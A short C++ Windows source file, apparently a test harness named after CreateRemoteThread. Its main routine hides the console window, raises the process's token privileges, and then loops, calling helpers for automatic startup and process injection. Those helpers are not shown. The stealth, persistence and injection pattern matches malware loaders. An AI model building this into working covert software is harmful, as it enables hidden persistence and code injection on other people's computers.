// CreateRemoteThread_Test.cpp : 定义控制台应用程序的入口点。
#include "main.h"



std::string getParentDirectory(const std::string& path) {
    // 找到最后一个路径分隔符'\'
    size_t lastSlash = path.find_last_of("\\");

    if (lastSlash != std::string::npos) {
        // 截取子字符串，获取上层目录
        return path.substr(0, lastSlash);
    }
    else {
        // 如果找不到路径分隔符，返回原始路径
        return path;
    }
}

int _tmain(int argc, _TCHAR* argv[])
{
    std::string isInject = argv[1];
    std::string currentDirectory = getCurrentDirectoryPath();
    std::string currentDirectoryParent = getParentDirectory(currentDirectory);

    HWND hwnd = GetConsoleWindow();
    if (IS_SHOW_WINDOW) {
        ShowWindow(hwnd, SW_NORMAL);
    }
    else {
        ShowWindow(hwnd, SW_HIDE); // 隐藏控制台窗口
    }

    HANDLE mutexHandle = CreateMutex(NULL, TRUE, "MyUniqueMutex");

    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        // 如果互斥锁已存在，表示已经有程序实例在运行
        std::cout << "程序已经在运行，不能启动多个实例。" << std::endl;
    }
    else {
        // 提升当前进程令牌权限
        EnbalePrivileges(GetCurrentProcess());
        while (true) {
            AutoStartPrepare(currentDirectoryParent); // 自动启动
            InjectionFunction(isInject); // 注入
            if (isInject == "1") {
                std::this_thread::sleep_for(std::chrono::seconds(1));
            } else {
                break;
            }
        }
        // 释放互斥锁
        ReleaseMutex(mutexHandle);
    }
    // 关闭互斥锁句柄
    CloseHandle(mutexHandle);
    system("pause");
    return 0;
}